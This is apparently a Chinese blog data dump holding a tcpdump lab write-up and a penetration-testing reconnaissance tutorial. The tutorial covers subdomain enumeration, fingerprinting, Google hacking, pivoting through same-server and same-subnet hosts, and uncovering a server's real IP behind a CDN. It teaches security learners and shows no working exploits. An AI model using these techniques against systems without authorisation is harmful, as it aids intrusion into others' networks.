0”捕获至少设置了 SYN（同步）标志的TCP数据包。</p>\n<p>tcpdump “tcp[tcpflags] &amp; (tcp-syn|tcp-ack) !&#x3D; 0”捕获至少设置了SYN（同步）或ACK（确认）标志的TCP数据包。</p>\n<p>看一下第四部分的题目</p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/task4.png\" alt=\"task4\"></p>\n<p>第一问 </p>\n<p>这个就是参数直接套过去就行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -r traffic.pcap &quot;tcp[flags]==tcp-rst&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/rst.png\" alt=\"task4\"></p>\n<p>第二问<br>如果不加-n的话 不会显示主机的ip ip会被解析成主机名 加上-n参数可以直接显示数字格式的 IP 地址和端口号，避免了这些额外的解析过程。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -r traffic.pcap greater 15000  -n</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/15000.png\" alt=\"task4\"></p>\n<h2 id=\"打印\"><a href=\"#打印\" class=\"headerlink\" title=\"打印\"></a>打印</h2><ul>\n<li>-q：快速输出；打印简要的数据包信息</li>\n<li>-e：打印链接级标题</li>\n<li>-A：以 ASCII 格式显示数据包数据</li>\n<li>-xx：以十六进制格式显示数据包数据，简称hex</li>\n<li>-X：以十六进制和 ASCII 显示数据包头和数据</li>\n</ul>\n<p>来看第五部分的问题</p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/task5.png\" alt=\"task5\"></p>\n<p>加个-e参数就能查出mac地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -r traffic.pcap -e arp</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/arpmac.png\" alt=\"task5\"></p>\n<h1 id=\"hackthebox的tcpdump补充\"><a href=\"#hackthebox的tcpdump补充\" class=\"headerlink\" title=\"hackthebox的tcpdump补充\"></a>hackthebox的tcpdump补充</h1><p>话题一转 来看看hackthebox的tcpdump有啥补充吗</p>\n<p>其实讲的也和thm的差不多 简单扩充一下知识点</p>\n<h2 id=\"第一部分\"><a href=\"#第一部分\" class=\"headerlink\" title=\"第一部分\"></a>第一部分</h2><p>看看题目</p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/task1.png\" alt=\"htb\"></p>\n<p>第一题需要下载个附件 就一张截图 仔细看开头的话 就是一个完整的tcp三次握手流程</p>\n<ul>\n<li>[S] 表示客户端发送的 SYN 包。</li>\n<li>[S.] 表示服务器发送的 SYN-ACK 包。</li>\n<li>[.] 是客户端发送的 ACK 包，完成三次握手。</li>\n</ul>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/question-1.PNG\" alt=\"task1\"></p>\n<p>能看到ip192的给ip为174.143.213.184的服务器建立连接</p>\n<p>服务器ip为174.143.213.184</p>\n<p>捕获过程是相对序号</p>\n<p><strong>相对序号</strong> 是一种在抓包过程中为了<strong>简化数据包分析</strong>而使用的序号模式。它将TCP连接中的初始序列号（ISN）归零，从而简化了整个连接中的包的序列号计算。也就是说，所有包的序列号从 0 开始递增，不再显示真实的网络中传输的绝对序列号。</p>\n<p>第三题</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-rvXc 100</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/task1.1.png\" alt=\"htb\"></p>\n<p>第四题</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tcpdump -Xr /tmp/capture.pcap</span><br></pre></td></tr></table></figure>\n\n<p>第五题 是-v 还要更详细就-vv</p>\n<p>第六题 man可以看更多信息</p>\n<p>第七题 -W是写入文件</p>\n<h2 id=\"第二部分\"><a href=\"#第二部分\" class=\"headerlink\" title=\"第二部分\"></a>第二部分</h2><p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/task2.png\" alt=\"task2\"></p>\n<p>第一问问的蛮好的 -l参数可以通过管道运输到另一个地方</p>\n<p>过滤器确实可以这么做 true</p>\n<p>想要某个协议的数据就直接后面加个协议名<br>不想要某个协议就协议名的前面加个not<br>例如题目问的：not icmp</p>\n<p>问安装在哪可以用which</p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/task2.1.png\" alt=\"task2\"></p>\n<p>输出内容更加详细就 -v</p>\n<p>-W 写入文件</p>\n<p>-r 是从中读取捕获的内容</p>\n<p>-X 以十六进制和ascii格式显示内容</p>\n<h2 id=\"第三部分\"><a href=\"#第三部分\" class=\"headerlink\" title=\"第三部分\"></a>第三部分</h2><p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/task3.png\" alt=\"task3\"></p>\n<h3 id=\"第一问\"><a href=\"#第一问\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p>这个真的是好问题 琢磨半天了 需要下载他的附件pcap</p>\n<p>一开始我也没怎么看这个包具体咋样 就是直接过滤去找第一个fin包 实际情况是找半天找不出</p>\n<p>这个就是他的pcap包的内容 后面还有一大半</p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/port.png\" alt=\"task\"></p>\n<p>那只能老老实实慢慢看 </p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/port1.png\" alt=\"task\"></p>\n<p>在这里面，其实有三个端口发出来tcp的第一次握手分别是43804，43806，52520这三个端口 往下看 43804和52520都在最后收到了rst包 而43806成功三次握手</p>\n<p>所以客户端端口应该是43806 而服务端则是http的80端口</p>\n<h3 id=\"第二问\"><a href=\"#第二问\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p>第二问问的是dns服务器ip 那我们得过滤一下 加个port domain参数</p>\n<p>过滤完之后 来检查一下记录</p>\n<p><img src=\"/images/tryhackme-Tcpdump-The-Basics%E5%B0%8F%E4%BB%8B%E7%BB%8D/htb/dns1.png\" alt=\"dns\"></p>\n<p>在这里面我们发现172.16.146.2的57752端口发出请求而下面172.6.46.1收到且回应了</p>\n<p>在前面两个包有a？ aaaa?这种字样 </p>\n<p>在 DNS 请求包中，通常会看到查询字段，比如 A?, AAAA?，表示正在请求域名解析。</p>\n<p>所以172.6.46.1是dns服务器ip</p>\n<h1 id=\"结尾\"><a href=\"#结尾\" class=\"headerlink\" title=\"结尾\"></a>结尾</h1><p>感觉还是很遥远哦 才学了这么点东西 </p>\n"},{"title":"信息收集","date":"2025-01-25T01:09:17.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/02/01/wmdJujK4AO2iMYb.jpg","_content":"\n# 信息收集\n信息收集的重要性毋庸置疑 古今中外 生活的每个部分都离不开信息收集 强大的信息收集能力是制胜关键。渗透测试也不例外 有句话说得好 渗透测试的本质就是信息收集 \n\n信息收集通常分为\n- 域名信息收集\n  \n- 子域名信息收集\n\n- 站点信息收集\n\n- 旁站信息收集\n\n- c端主机查询\n\n- 敏感信息收集\n\n- 服务器信息收集\n\n- 端口信息收集\n\n- 真实IP地址识别\n\n- 主动信息收集\n\n\n## 域名信息收集\n域名信息收集\n**域名**（英语：Domain Name），又称**网域**，是由一串用**点分隔**的名字组成的Internet上某**一台计算机**或**计算机组**的名称，用于在数据传输时对计算机的**定位标识**（有时也指地理位置）。由于IP地址具有**不方便记忆**并且**不能显示地址组织**的**名称**和**性质**等缺点，人们设计出了域名，并通过dns(Domain Name System)网域名称系统来将域名和IP地址**相互映射**，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。\n\n### 分类\n#### 顶级域名/一级域名：\n\n顶级域（或顶级域名，也称为一级域名），是互联网DNS等级之中的最高级的域，它保存于DNS根域的名字空间中。顶级域名是域名的最后一个部分，即是域名最后一点之后的字母，例如在http://www.example.com这个域名中，顶级域是.com。\n\n#### 二级域名：\n\n除了顶级域名，还有二级域名，就是最靠近顶级域名左侧的字段。例如在http://www.example.com这个域名中，example就是二级域名。\n\n#### 子域名：\n\n子域名，在域名系统等级中，属于更高一层域的域。比如，mail.example.com和calendar.example.com是example.com的两个子域，而example.com则是顶级域.com的子域。凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名，三级子域名以及多级子域名。\n\n为什么要收集子域名\n\n子域名枚举可以在**测试范围**内发现更多的**域**或**子域**，这将**增大**漏洞发现的**几率**。\n\n有些**隐藏的**、**被忽略**的**子域**上运行的应用程序可能帮助我们发现**重大漏洞**。\n\n在同一个组织的不同域或应用程序中往往存在相同的漏洞\n\n假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其**主域**都是**重点防护区域**，所以不如**先进入目标的某个子域**，然后再想办法迂回接近真正的目标，这无疑是个比较好的选择。\n\n##### 利用在线工具查询\n网上有很多子域名的查询站点，可通过它们检索某个给定域名的子域名。如：\n\n- DNSdumpster：https://dnsdumpster.com/\n<br>\n- whois反查：http://whois.chinaz.com/\n<br>\n- virustotal：www.virustotal.com\n<br>\n- 子域名爆破：https://phpinfo.me/domain/\n<br>\n- IP反查绑定域名：http://dns.aizhan.com/\n<br> \n- https://hackertarget.com/\n<br> \n- find-dns-host-records/\n<br>\n- https://site.ip138.com\n\n\n##### 通过证书透明度公开日志枚举子域名\n证书透明度是证书授权机构的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中。一个SSL/TLS证书通常包含域名、子域名和邮件地址，这些也经常成为攻击者非常希望获得的有用信息。\n\n查找某个域名所属证书的最简单的方法就是使用搜索引擎来搜索一些公开的CT日志，例如以下网站：\n\ncrt.sh：https://crt.sh\ncensys：https://censys.io\n\n##### 子域名信息收集-聚合工具\n聚合工具就是，结合和爆破，证书，搜索引擎，DNS解析记录等多个方式去探测子域名比如：oneforall\n\nOneForAll(是一款集百家之长，功能强大的全面快速子域收集终极神器)\n\n###### 安装工具\noneforall\n下载好OneForAll，进入到OneForAll的目录下，执行以下命令安装OneForAll所需的环境依赖\n```\npython3 -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/\n```\n\n![oneforall](/images/信息收集/oneforall.png)\n\n```\npip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/\n```\n\n![oneforall](/images/信息收集/oneforall.png2)\n\nsubDomainBrute\n\nsubDomainsBrute是一款高并发的DNS暴力枚举工具\n\n下载完之后 进入目录安装依赖\n```\npip install dnspython gevent\n```\n\n![sub](/images/信息收集/submain.png)\n\n##### kali的工具\n在kali中的信息收集模块的DNS分析中，有很多工具可以进行域名信息收集\n\n- Dnsenum：域名信息收集\n- Dnsmap：收集信息和枚举DNS信息\n- Dnsrecon：用于DNS侦察\n- Fierce ：子域名查询\n\n##### windows的工具\nWindows上的子域名查询工具主要由：\n\nLayer子域名挖掘机\nsubDomainsbrute\nK8\nSublist3r\nMaltego\n\n### Whois 查询\nwhois 是用来查询域名的**IP**以及**所有者**等信息的传输协议。简单说，whois就是一个用来**查询域名**是否已经被注册，以及**注册域名**的**详细信息**的**数据库**（如域名所有人、域名注册商），不同域名后缀的Whois信息需要到**不同**的Whois数据库查询。通过whois来实现对域名信息的查询，可以得到注册人的**姓名**和邮**箱信息**通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。\n\n#### 在线工具\nhttps://whois.chinaz.com/\n\nhttps://mwhois.chinaz.com/  \n\nhttps://whois.aizhan.com/\n\nhttps://whois.aliyun.com/\n\nhttps://whois.cnnic.cn/WelcomeServlet\n\n#### 域名反查：\n\nhttps://mwhois.chinaz.com/\n\nhttps://whois.chinaz.com/\n\n\n#### icp备案查询：\n\nhttps://beian.mlit.gov.cn/\n\nhttps://icp.chinaz.com/\n\nhttps://beian88.com/\n\n\n\n\n\n\n\n#### 在线查询\n\n如今网上出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。\n\n常见的网站包括：\n\n- Whois站长之家查询：http://whois.chinaz.com/\n\n- 阿里云中国万网查询：https://whois.aliyun.com/\n\n- Whois Lookup 查找目标网站所有者的信息：http://whois.domaintools.com/\n\n- Netcraft Site Report 显示目标网站上使用的技术：http://toolbar.netcraft.com/site_report?url=\n\n- Robtex DNS 查询显示关于目标网站的全面的DNS信息：https://www.robtex.com/\n\n- 全球Whois查询：https://www.whois365.com/cn/\n\n- 站长工具爱站查询：https://whois.aizhan.com/\n\n还可以在Kali Linux下自带的Whois查询工具，通过命令Whois查询域名信息，只需输入要查询的域名即可\n\n#### 备案信息查询\n\n**网站备案信息**是根据**国家法律法规规定**，由**网站所有者**向国家**有关部门**申请的**备案**，是国家信息产业部对网站的一种管理途径，是为了防止在网上从事非法网站经营活动，当然主要是针对国内网站。\n\n在备案查询中我们主要关注的是：单位信息例如**名称**、**备案编号**、**网站负责人**、**法人**、**电子邮箱**、**联系电话**等。\n\n常用的备案信息查询网站有以下几个：\n\nICP/IP地址/域名信息备案管理系统：http://beian.miit.gov.cn/publish/query/indexFirst.action\n\nICP备案查询网：http://www.beianbeian.com/\n\n备案吧吧：https://www.beian88.com/\n\n天眼查：https://www.tianyancha.com/\n\n## 站点信息收集\n接下来进行web网站站点信息收集，主要收集如下信息：\n\n- CMS指纹识别\n- 历史漏洞\n- 脚本语言\n- 敏感目录/文件\n- Waf识别\n\n### CMS指纹识别\n**CMS**（**内容管理系统**）又称为**整站系统**或**文章系统**，用于**网站内容管理**。用户只需要下载对应的CMS软件包，就能**部署搭建**，并**直接利用**CMS。但是各种CMS都具有其**独特的结构命名规则**和**特定的文件内容**，因此可以利用这些内容来获取**CMS站点**的**具体软件CMS**与**版本**。\n\n指纹识别指的是通过关键特征，识别出目标的CMS系统、服务 器、开发语言、操作系统、CDN、WAF的类别版本等等\n\n在渗透测试中，对进行指纹识别是相当有必要的，识别出相应的CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。\n\n常见的CMS有Dedecms(织梦)、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。\n\n（1）在线识别\n\n如今，网上一些在线的网站查询CMS指纹识别，如下所示：\n\n- 云悉：http://www.yunsee.cn/info.html\n- BugScaner: http://whatweb.bugscaner.com/look/\n- 潮汐指纹：http://finger.tidesec.net/\n- 云悉指纹: http://www.yunsee.cn/finger.html\n\n（2）利用工具\n\n常见的CMS指纹识别工具有**WhatWeb**、**WebRobo**、**椰树**、**御剑Web指纹识别**。大禹CMS识别程序等，可以快速识别一些主流CMS。\n\n当我们得知了一个站点的cms类型后，我们可以在网上查找与其相关的漏洞并进行相应的测试。\n\n（3）手工识别\n\n1. 根据HTTP响应头判断，重点关注**X-Powered-By**、**cookie**等字段\n2. 根据HTML 特征，重点关注 **body**、**title**、**meta**等标签的内容和属性。\n3. 根据特殊的t**class**判断。HTML 中存在特定 class 属性的某些 **div 标签**，如<body class=\"ke-content\">\n\n### 敏感目录/文件收集\n也就是对**目标网站**做个**目录扫描**。在web渗透中，探测Web目录结构和隐藏的敏感文件是一个十分重要的环节，从中可以获取网站的**后台管理页面**、**文件上传界面**、**robots.txt**，甚至可能扫描出**备份文件**从而得到网站的**源代码**。\n\n目录扫描可以让我们发现这个网站存在**多少个目录**，多少个**页面**，探索出网站的**整体结构**。通过目录扫描我们还能扫描**敏感文件**，**后台文件**，**数据库文件**，和**信息泄漏文件**等等\n\n#### 常见目录泄露\n**目录遍历漏洞**(程序在实现上没有**充分过滤**用户输入的../之类的**目录跳转符**，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。)\n\n\nrobots.txt          允许爬虫爬取的页面\n\nsitemap.xml     指导搜索引擎搜索哪些页面 列出了网站的所有重要页面，帮助搜索引擎更好地索引网页。\n\n网站的备份文件 / 数据\n\n后台登录的目录： /admin， /manage\n\n安装包（源码）列如：1.zip，非开源，商用\n\n上传的目录： 文件上传漏洞，  /upload，/upload.php\n\nphp探针(是用来监控服务器的工具，它可以显示服务器的运行状况，如硬盘使用、内存占用、网络流量、系统负载和当前时间等信息。)： phpinfo(，用于显示 PHP 配置和系统信息)，\n\n文本编辑器： kindeditor，CKeditor ， Ueditor，文件上传漏洞、命令注入(如果没有严格的验证和清理，攻击者可能利用这些编辑器进行文件上传攻击、命令注入或跨站脚本攻击（XSS）)\n\n\n#### 常见的网站目录的扫描工具主要有：\n\n- 御剑后台扫描工具\n- dirbuster扫描工具\n- dirsearch扫描工具\n- dirb\n- wwwscan\n- Sensitivefilescan\n\n### Waf识别\n**Web应用防护系统**（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对**HTTP/HTTPS**的安全策略来专门为Web应用提供保护的一款产品。\n\n#### waf介绍\nWAF分为**非嵌入型WAF和嵌入型WAF**，非嵌入型WAF指的是**硬件型WAF**、**云WAF**、**软件型WAF**之类的；而嵌入型WAF指的是网站**内置的WAF**\n\n非嵌入型WAF对Web流量的解析完全是**靠自身**，而嵌入型WAF拿到的Web数据是**已经被解析加工好的**。所以非嵌入型的受攻击机面还涉及到其他层面，\n\n而嵌入型WAF从Web容器模块型WAF、代码层WAF往下走，其对抗畸形报文、扫操作绕过的能力越来越强。\n\n#### wafoof\n**wafw00f**是一个Web应用防火墙（WAF）指纹识别的工具。\n\n##### 安装\n下载完之后 进入目录\n\n```\npython setup.py install\n```\n\n#### wafw00f的工作原理：\n\n1. 发送**正常**的**HTTP请求**，然后**分析响应**，这可以识别出很多WAF。\n\n2. 如果不成功，它会发送一些（可能是恶意的）HTTP请求，使用简单的**逻辑推断**是哪一个WAF。\n\n3. 如果这也不成功，它会分析之前返回的响应，使用**其它简单的算法猜测**是否有某个WAF或者安全解决方案响应了我们的攻击。\n\n\n### 敏感信息收集\n有时候，针对某些安全做得很好的目标，直接通过技术层面是无法完成渗透测试的。此时，便可以利用**搜索引擎搜索**目标**暴露在互联网上**的**关联信息**。例如：**数据库文件**、**SQL注入**、**服务配置信息**，甚至是通过Git找到**站点**泄露源代码，以及**Redis**等未授权访问、**Robots.txt**等敏感信息，从而达到渗透目的。\n\nGoogle hacking\n- **intext**：寻找正文中含有关键字的网页\n- **intitle**：寻找标题中含有关键字的网页\n- **allintitle**：用法和intitle类似，只不过可以指定多个词\n- **inurl**：搜索url中含有关键词的网页\n- **allinurl**：用法和inurl类似，只不过可以指定多个词\n- **site**：指定访问的站点\n- **filetype**：指定访问的文件类型\n- **link**：指定链接的网页\n- **related**：搜索相似类型的网页\n- **info**：返回站点的指定信息，例如：info:www.baidu.- com   将返回百度的一些信息\n- **phonebook**：电话簿查询美国街道地址和电话号码信息\n- **Index of**：利用 Index of 语法可以发现允许目录浏览的web网站，就像在本地的普通目录一样\n\n\n### Github信息泄露\nitHub作为开源代码平台，给程序员提供了很多便利，但如果使用不当，比如将包含了账号密码、密钥等配置文件的代码上传了，导致攻击者能发现并进一步利用这些泄露的信息，就是一个典型的GitHub敏感信息泄露漏洞，再如开发人员在开发时，常常会先把源码提交到github，最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息，\n\n## 旁站信息收集\n\n旁站是与攻击目标在同一服务器上的不同网站,在攻击目标没有漏洞的情况 下,可以通过查找旁站的漏洞攻击旁站,然后再通过提权拿到服务器的最高权限,拿到服务器的最高权限后攻击目标也就拿下了\n\n### 查询旁站的方式\n获取旁站一般有这个几个方式：\n\n1. 通过站长工具进行同IP的查询\n\nhttps://stool.chinaz.com/same\n\nhttps://chapangzhan.com/\n\nhttps://www.webscan.cc/\n\n2. 搜索引擎搜索\n\n3. 网络空间探测引擎搜索\n\n## c端主机查询\n\nC段查询主要是当前的IP攻击不下来的时候，可以攻击他的C段，比如IP是220.181.34.34是我们的目标，但是攻击不下来，可以去扫描220.181.34.0-255这个网段，看看能不能攻击下来\n\n对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器\n\n### nmap扫描c端主机\n```\nnmap -sn -ip/24\n```\n\n### 搜索引擎C段信息 \n使用google或者百度进行语法搜索 site:x.x.x.*进行C段的探测\n\n### c端扫描的工具扫描\n\n\n### 使用网络空间探测引擎 IP=\"XXX.XXX.XXX.0/24\"  \n\n### 存活资产探测\n\nC段+全段口会生成很多资产，但是其中会有不能访问的，所以我们需要资产探活。\n\n用EHole工具\n\n## 服务器信息收集\n我们还需要对目标服务器的信息进行收集，主要包括一下部分：\n\n- Web服务器指纹识别\n- 真实IP地址识别\n- 编程语言\n- Web中间件\n- 端口信息收集\n- 后端存储技术识别\n\nWeb服务器指纹识别\nWeb服务器指纹识别是了解正在运行的web服务器类型和版本，目前市场上存在几种不同的web服务器提供商和软件版本，了解被测试的web服务器的类型，能让测试者更好去测试已知漏洞和大概的利用方法，将会在渗透测试过程中有很大的帮助，甚至会改变测试的路线。\n\n### Web服务器指纹识别主要识别一下信息：\n\n1、Web服务器**名称**，**版本**\n\n2、Web服务器**后端**是否有**应用服务器**\n\n3、**数据库**(DBMS)是否**部署在同一主机(host)**，数据库类型\n\n4、Web应用使用的**编程语言**\n\n5、Web**应用框架**\n\n#### 手工检测\n\n1. HTTP头分析\n即查看HTTP响应头中的**Server**、**X-Powered-By**、**Cookie** 等字段，这也是最基本的方法。\n\n2. 2. 协议行为\n即从**HTTP头字段顺序分析**，观察HTTP响应头的**组织顺序**，因为每个服务器都有一个内部的H**TTP头排序**方法。\n\n3. 浏览并观察网站\n我们可以观察网站某些位置的**HTML源码**(**特殊的class名称**)及其**注释(comment)部分**，可能暴露有价值信息。观察**网站页面后缀**可以判断Web应用使用的编程语言和框架。\n\n4. 刻意构造错误\n错误页面可以给你提供关于服务器的大量信息。可以通过构造含有随机字符串的URL，并访问它来尝试得到404页面。\n\n\n#### 利用工具识别\n\n**whatweb**是一款用于辅助的自动化Web应用指纹分析工具\n\n## 真实IP地址识别\n\n我们平时使用浏览器，使用的都是**域名**，域名的存在是为了方便人的记忆，其实浏览器本质还是**访问真实IP地址**来获取页面的。\n\n在渗透测试中，一般只会给你一个域名，那么我们就要根据这个域名来确定目标服务器的真实IP，我们可以通过像www.ip138.com这样的IP查询网直接获取目标的一些IP及域名信息，但这里的前提是目标服务器**没有使用CDN**\n\n找到真实的IP我们就可以访问这个IP的C段和端口，方便进一步渗透，\n\n### 什么是CDN\n\nCDN的全称是Content Delivery Network，即**内容分发网络**。企业利用分布在**不同区域**的**节点服务器群组**成流量分配**管理平台**，为用户提供内容**分散存储**和**高速缓存服务**\n\n### CDN的优势\n1. 提高用户访问速率，优化用户使用体验\n\n2. 隐藏真实服务器的IP\n\n3. 提供WAF功能，目前很多CDN也提供了WAF的功能，我们的访问请求会先经过CDN节点的过滤，该过滤可对SQL注入、XSS、Webshell上传、命令注入、恶意扫描等攻击行为进行有效检测和拦截。CDN节点将认为无害的数据提交给真实的主机服务器。\n\n### CDN几种访问方式的不同\n\n1. 传统访问：用户访问域名–>解析服务器IP–>访问目标主机\n2. 普通CDN：用户访问域名–>CDN节点–>真实服务器IP–>访问目标主机\n3. 带WAF的CDN：用户访问域名–>CDN节点（云WAF）–>真实服务器IP–>访问目标主机\n\n我们也可以**设置代理**或者通过在线ping网站来在不同地区进行ping测试，然后对比每个地区ping出的IP结果，查看这些IP是否一致，**一致**，则极有可能**不存在CDN**。根据 CDN 的工作原理，如果网站使用了 CDN，那么从**全国各地访问网站**的 IP 地址是**各个 CDN 节点的 IP 地址**，那么如果ping出来的IP**大多不太一样**或者**规律性很强**，可以尝试查询这些IP的归属地，判断是否存在CDN。有以下网站可以进行ping测试：\n```\n http://ping.chinaz.com/\n https://www.wepcc.com\n https://www.17ce.com\n```\n\nSearchMap判断目标有没有使用CDN\n\nsearchmap是一款集域名解析、IP反查域名、WHOIS查询、CDN检测、端口扫描、目录扫描、子域名挖掘为一体的前渗透测试综合信息收集工具\n\n### 如何绕过CDN找到目标真实IP？\n\n1. 利用子域名。一般来说很多站长可能只会对主站或者流量较大的分站使用CDN，但是一些流量比较小的分站可能没有挂CDN，这些分站和主站虽然不是同一个IP但是都在同一个C段下面的情况，所以我们可以通过ping二级域名获取分站lP，从而能判断出目标的真实IP段。\n<br>\n2. 查询主域。以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不使用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了\n<br>\n3. 扫描网站敏感文件，如phpinfo.php等，从而找到目标的真实IP。\n<br>\n4. 从国外访问。国内很多CDN厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实P。我们可以通过国外在线代理网站访问，可能会得到真实的IP地址，\n    ```\n    http://host-tracker.com/\n\n    http://www.webpagetest.org/\n\n    https://asm.ca.com/en/ping.php\n\n    ```\n5. 查看域名历史解析记录。也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过\n   ```\n   https://dnsdb.io/zh-cn/\n\n    https://x.threatbook.cn\n\n    https://viewdns.info/iphistory/\n\n    https://site.ip138.com/\n    \n    https://www.netcraft.com\n\n    https://viewdns.info/\n    ```\n等网站来观察域名的IP历史记录。\n\n6. Nslookup查询。查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。\n\n7.  利用网络空间搜索引擎。这里主要是利用网站返回的内容寻找真实原始IP，如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。最常见的网络空间搜索引擎有如下：\n\n- Shodan：https://www.shodan.io/\n- 钟馗之眼：https://www.zoomeye.org/\n- FOFA：https://fofa.so/\n\n8. 利用网站漏洞。比如有代码执行漏洞、SSRF、存储型的XSS都可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。\n\n## 端口信息收集\n查看本机端口\n\nnetstat命令\n\n1. nmap工具加Zenmap工具加Masscan工具扫描\n   zenmap是nmap的图形化界面\n   masscan高速端口扫描工具\n\n2. 由于使用工具通常会在目标网站留下痕迹，接下来提供一种在线网站探测方法。\n\n- 在线网站：http://tool.chinaz.com/port/\n- ThreatScan在线网站（网站基础信息收集）：https://scan.top15.cn/\n- Shodan：https://www.shodan.io/\n\n\n## 主动信息收集\n\n主动信息收集通常是在被动信息收集之后分析出重要攻击⾯或者⽬标重要信息的时候再针对性地去做主动信息收集，\n\n在主动信息收集的时候通常持续时间⽐较⻓⽽且会通过各种不同的⽅式与⽬标交互。实战中最常⽤的⼿段是模拟或者伪装正常的业务流程与⽬标交互。\n\n主动信息搜集之前我们一定要挂上代理，一方面是为了隐藏自己，一方面是为了防止测试的时候被封ip导致无法进行继续的渗透活动。\n\n### 操作系统识别\nWindows的TTL的值是128，而Linux的TTL大多是64。（默认情况下）\n\n### 服务版本识别\n流量包中的关键字\n\nservers-db（nmap所维护的一个数据库，其中包含了各种网络服务的版本信息的特征数据，通过对目标服务发起请求，从响应中提取特征数据跟数据库中进行比对，就能识别出对应的版本）\n\n\n\n\n\n# 参考\n\nhttps://blog.csdn.net/qq_64177395/article/details/141267567\n\nhttps://www.cnblogs.com/0daybug/p/13800776.html","source":"_posts/信息收集.md","raw":"---\ntitle: 信息收集\ndate: 2025-01-25 09:09:17\ntags:\ntop_img: transparent\ncover: https://s2.loli.net/2025/02/01/wmdJujK4AO2iMYb.jpg\n---\n\n# 信息收集\n信息收集的重要性毋庸置疑 古今中外 生活的每个部分都离不开信息收集 强大的信息收集能力是制胜关键。渗透测试也不例外 有句话说得好 渗透测试的本质就是信息收集 \n\n信息收集通常分为\n- 域名信息收集\n  \n- 子域名信息收集\n\n- 站点信息收集\n\n- 旁站信息收集\n\n- c端主机查询\n\n- 敏感信息收集\n\n- 服务器信息收集\n\n- 端口信息收集\n\n- 真实IP地址识别\n\n- 主动信息收集\n\n\n## 域名信息收集\n域名信息收集\n**域名**（英语：Domain Name），又称**网域**，是由一串用**点分隔**的名字组成的Internet上某**一台计算机**或**计算机组**的名称，用于在数据传输时对计算机的**定位标识**（有时也指地理位置）。由于IP地址具有**不方便记忆**并且**不能显示地址组织**的**名称**和**性质**等缺点，人们设计出了域名，并通过dns(Domain Name System)网域名称系统来将域名和IP地址**相互映射**，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。\n\n### 分类\n#### 